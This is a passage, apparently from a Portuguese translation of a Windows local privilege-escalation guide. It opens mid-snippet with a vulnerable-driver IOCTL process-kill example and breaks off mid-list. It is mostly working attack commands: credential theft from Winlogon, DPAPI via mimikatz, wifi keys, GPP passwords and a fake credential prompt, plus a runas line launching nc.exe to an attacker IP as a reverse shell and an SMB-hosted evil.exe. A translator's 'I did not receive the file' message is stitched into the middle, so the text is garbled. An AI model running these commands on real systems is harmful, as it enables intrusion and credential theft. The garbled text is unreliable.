HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigações para desenvolvedores
- Sempre defina FILE_DEVICE_SECURE_OPEN ao criar device objects destinados a serem restritos por um DACL.
- Valide o contexto do chamador para operações privilegiadas. Adicione verificações PP/PPL antes de permitir a terminação de processos ou o retorno de handles.
- Restringir IOCTLs (access masks, METHOD_*, validação de entrada) e considerar modelos brokered em vez de privilégios diretos no kernel.

Ideias de detecção para defensores
- Monitore user-mode opens de nomes de device suspeitos (e.g., \\ .\\amsdk*) e sequências específicas de IOCTL indicativas de abuso.
- Aplique a blocklist de drivers vulneráveis da Microsoft (HVCI/WDAC/Smart App Control) e mantenha suas próprias allow/deny lists.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Verifique as permissões de todas as pastas dentro do PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para mais informações sobre como abusar desta verificação:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Rede

### Compartilhamentos
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Verifique se existem outros computadores conhecidos hardcoded no hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces de Rede & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Portas Abertas

Verifique externamente a presença de **serviços restritos**
```bash
netstat -ano #Opened ports?
```
### Tabela de Roteamento
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regras de Firewall

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(listar regras, criar regras, desligar, desligar...)**

Mais[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Subsistema do Windows para Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
O binário `bash.exe` também pode ser encontrado em `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se você obtiver o usuário root, pode escutar em qualquer porta (na primeira vez que você usar `nc.exe` para escutar em uma porta ele perguntará via GUI se `nc` deve ser permitido pelo firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar facilmente o bash como root, você pode tentar `--default-user root`

Você pode explorar o sistema de arquivos do `WSL` na pasta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenciais do Windows

### Credenciais do Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gerenciador de credenciais / Windows vault

Fonte [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
O Windows Vault armazena credenciais de usuário para servidores, sites e outros programas que o **Windows** pode **efetuar login nos usuários automaticamente**. À primeira vista, pode parecer que os usuários podem armazenar suas credenciais do Facebook, Twitter, Gmail etc., para que façam login automaticamente via navegadores. Mas não é assim.

O Windows Vault armazena credenciais que o Windows pode usar para efetuar login dos usuários automaticamente, o que significa que qualquer **aplicativo Windows que precise de credenciais para acessar um recurso** (servidor ou um site) **pode fazer uso deste Credential Manager** e do Windows Vault e usar as credenciais fornecidas em vez dos usuários digitarem o nome de usuário e a senha o tempo todo.

A menos que as aplicações interajam com o Credential Manager, não acho que seja possível para elas usarem as credenciais para um determinado recurso. Portanto, se seu aplicativo quiser usar o vault, ele deve de alguma forma **comunicar-se com o Credential Manager e solicitar as credenciais para esse recurso** do cofre de armazenamento padrão.

Use o `cmdkey` para listar as credenciais armazenadas na máquina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Então você pode usar `runas` com a opção `/savecred` para usar as credenciais salvas. O exemplo a seguir chama um remote binary via um SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` com um conjunto de credenciais fornecidas.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Observe que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ou o [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

A **Data Protection API (DPAPI)** fornece um método para criptografia simétrica de dados, usada predominantemente no sistema operacional Windows para a criptografia simétrica de chaves privadas assimétricas. Essa criptografia aproveita um segredo do usuário ou do sistema para contribuir significativamente para a entropia.

**DPAPI permite a criptografia de chaves através de uma chave simétrica derivada dos segredos de login do usuário**. Em cenários envolvendo criptografia do sistema, ele utiliza os segredos de autenticação de domínio do sistema.

Chaves RSA de usuário criptografadas, ao usar DPAPI, são armazenadas no diretório %APPDATA%\Microsoft\Protect\{SID}, onde {SID} representa o [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **A DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, normalmente consiste em 64 bytes de dados aleatórios. (É importante notar que o acesso a esse diretório é restrito, impedindo listar seu conteúdo via o comando `dir` no CMD, embora possa ser listado através do PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Você pode usar o **mimikatz module** `dpapi::masterkey` com os argumentos apropriados (`/pvk` ou `/rpc`) para descriptografá-lo.

Os **arquivos de credenciais protegidos pela senha mestra** geralmente estão localizados em:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Você pode usar **mimikatz module** `dpapi::cred` com o `/masterkey` apropriado para descriptografar.\
Você pode **extrair muitos DPAPI** **masterkeys** da **memory** com o `sekurlsa::dpapi` module (se você for root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenciais do PowerShell

**Credenciais do PowerShell** são frequentemente usadas para tarefas de **scripting** e automação como uma forma conveniente de armazenar credenciais criptografadas. As credenciais são protegidas usando **DPAPI**, o que normalmente significa que só podem ser descriptografadas pelo mesmo usuário no mesmo computador em que foram criadas.

Para **descriptografar** uma credencial PS a partir do arquivo que a contém, você pode fazer:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Conexões RDP Salvas

Você pode encontrá-las em `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e em `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos executados recentemente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gerenciador de Credenciais da Área de Trabalho Remota**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use o módulo **Mimikatz** `dpapi::rdg` com o `/masterkey` apropriado para **descriptografar quaisquer arquivos .rdg**\
Você pode **extrair muitos DPAPI masterkeys** da memória com o Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Observe que para recuperar senhas do AppCmd.exe você precisa ser Administrador e executar em um alto nível de integridade.**\
**AppCmd.exe** está localizado no diretório `%systemroot%\system32\inetsrv\`.\\
Se esse arquivo existir, então é possível que algumas **credentials** tenham sido configuradas e possam ser **recuperadas**.

Este código foi extraído de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Verifique se `C:\Windows\CCM\SCClient.exe` existe .\
Instaladores são **executados com privilégios SYSTEM**, muitos são vulneráveis a **DLL Sideloading (Info de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Arquivos e Registro (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Chaves de Host do Putty SSH
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Chaves SSH no registro

Chaves privadas SSH podem ser armazenadas dentro da chave de registro `HKCU\Software\OpenSSH\Agent\Keys`, então você deve verificar se há algo interessante lá:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se encontrar qualquer entrada dentro desse caminho provavelmente será uma SSH key salva. Ela é armazenada criptografada, mas pode ser facilmente descriptografada usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Mais informações sobre esta técnica aqui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se o serviço `ssh-agent` não estiver em execução e você quiser que ele inicie automaticamente na inicialização, execute:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Parece que esta técnica não é mais válida. Tentei criar algumas chaves SSH, adicioná-las com `ssh-add` e fazer login via SSH em uma máquina. O registro HKCU\Software\OpenSSH\Agent\Keys não existe e o procmon não identificou o uso de `dpapi.dll` durante a autenticação por chave assimétrica.

### Arquivos unattended
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Você também pode procurar por esses arquivos usando **metasploit**: _post/windows/gather/enum_unattend_

Conteúdo de exemplo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backups do SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenciais em Nuvem
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Procure por um arquivo chamado **SiteList.xml**

### Senha do GPP em cache

Uma funcionalidade permitia anteriormente a implantação de contas locais de administrador personalizadas em um conjunto de máquinas via Group Policy Preferences (GPP). No entanto, esse método apresentava falhas de segurança significativas. Primeiramente, os Group Policy Objects (GPOs), armazenados como arquivos XML em SYSVOL, podiam ser acessados por qualquer usuário do domínio. Em segundo lugar, as senhas dentro desses GPPs, criptografadas com AES256 usando uma chave padrão documentada publicamente, podiam ser descriptografadas por qualquer usuário autenticado. Isso representava um risco sério, pois poderia permitir que usuários obtivessem privilégios elevados.

Para mitigar esse risco, foi desenvolvida uma função para escanear arquivos GPP em cache local que contivessem um campo "cpassword" não vazio. Ao encontrar tal arquivo, a função descriptografa a senha e retorna um objeto PowerShell customizado. Esse objeto inclui detalhes sobre o GPP e a localização do arquivo, auxiliando na identificação e correção dessa vulnerabilidade de segurança.

Procure em `C:\ProgramData\Microsoft\Group Policy\history` ou em _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior ao Windows Vista)_ por estes arquivos:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descriptografar o cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec para obter as senhas:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configuração Web do IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemplo de web.config com credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenciais OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Pedir credentials

Você sempre pode **pedir ao user para inserir suas credentials ou mesmo as credentials de outro user** se achar que ele pode conhecê-las (observe que **pedir** diretamente ao client pelas **credentials** é realmente **arriscado**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possíveis nomes de arquivos que contêm credenciais**

Arquivos conhecidos que, há algum tempo, continham **senhas** em **texto simples** ou **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Não recebi o conteúdo do arquivo. Por favor cole o conteúdo de src/windows-hardening/windows-local-privilege-escalation/README.md que você quer que eu traduza (manterei a sintaxe Markdown/HTML e não traduzirei códigos, links ou tags).
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenciais na RecycleBin

Você também deve verificar o Bin para procurar credenciais dentro dele

Para **recuperar senhas** salvas por vários programas você pode usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dentro do registro

**Outras possíveis chaves do registro com credenciais**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Histórico dos navegadores

Você deve verificar por dbs onde senhas do **Chrome or Firefox** são armazenadas.\
Verifique também o histórico, bookmarks e favoritos dos navegadores, pois talvez algumas **senhas estejam** armazenadas lá.

Ferramentas para extrair senhas dos navegadores:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Sobrescrita de DLLs COM**

**Component Object Model (COM)** é uma tecnologia integrada ao sistema operacional Windows que permite a **intercomunicação** entre componentes de software de diferentes linguagens. Cada componente COM é **identificado via um class ID (CLSID)** e cada componente expõe funcionalidade através de uma ou mais interfaces, identificadas via interface IDs (IIDs).

As classes e interfaces COM são definidas no registro em **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface**, respectivamente. Esse registro é criado pela junção de **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro dos CLSIDs desse registro você pode encontrar o subregistro **InProcServer32** que contém um **valor padrão** apontando para uma **DLL** e um valor chamado **ThreadingModel** que pode ser **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ou **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basicamente, se você conseguir **sobrescrever qualquer uma das DLLs** que serão executadas, você pode **escalar privilégios** se essa DLL for executada por um usuário diferente.

Para saber como atacantes usam COM Hijacking como mecanismo de persistência, veja:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Busca genérica por senhas em arquivos e no registro**

**Procurar conteúdo de arquivos**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Procurar por um arquivo com um determinado nome de arquivo**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pesquisar no registro por nomes de chaves e senhas**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **é um plugin do msf** que criei para **executar automaticamente todos os metasploit POST modules que procuram por credentials** dentro da vítima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) procura automaticamente por todos os arquivos contendo passwords mencionados nesta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) é outra ótima ferramenta para extrair password de um sistema.

A ferramenta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) procura por **sessions**, **usernames** e **passwords** de várias ferramentas que salvam esses dados em clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine que **um processo em execução como SYSTEM abra um novo processo** (`OpenProcess()`) com **full access**. O mesmo processo **também cria um novo processo** (`CreateProcess()`) **com privilégios baixos, mas herdando todos os handles abertos do processo principal**.\
Então, se você tiver **full access ao processo com privilégios baixos**, você pode capturar o **handle aberto do processo privilegiado criado** com `OpenProcess()` e **injetar um shellcode**.\
[Leia este exemplo para mais informações sobre **como detectar e explorar esta vulnerabilidade**.](leaked-handle-exploitation.md)\
[Leia este **outro post para uma explicação mais completa sobre como testar e abusar de mais open handlers de processos e threads herdados com diferentes níveis de permissões (não apenas full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Diversos

### Extensões de arquivo que podem executar código no Windows

Confira a página **[https://filesec.io/](https://filesec.io/)**

### **Monitorando linhas de comando em busca de senhas**

Ao obter um shell como usuário, pode haver tarefas agendadas ou outros processos sendo executados que **passam credenciais na linha de comando**. O script abaixo captura as linhas de comando dos processos a cada dois segundos e compara o estado atual com o estado anterior, exibindo quaisquer diferenças.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se você tiver acesso à interface gráfica (via console ou RDP) e o UAC estiver habilitado, em algumas versões do Microsoft Windows é possível executar um terminal ou qualquer outro processo como "NT\AUTHORITY SYSTEM" a partir de um usuário sem privilégios.

Isso permite escalar privilégios e contornar o UAC ao mesmo tempo usando a mesma vulnerabilidade. Além disso, não há necessidade de instalar nada e o binary usado durante o processo é assinado e emitido pela Microsoft.

Alguns dos sistemas afetados são os seguintes:
```
SERVER
======

